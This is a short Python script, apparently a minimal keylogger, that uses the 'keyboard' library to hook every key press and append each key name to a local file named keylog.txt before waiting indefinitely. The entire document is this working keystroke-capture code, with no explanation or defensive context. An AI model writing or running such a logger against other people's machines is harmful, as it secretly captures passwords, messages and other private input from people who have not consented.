#pip install keyboard

import keyboard

def pressedkeys(key):
    with open('keylog.txt', 'a') as file:
        if key.name=='space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedkeys)
keyboard.wait()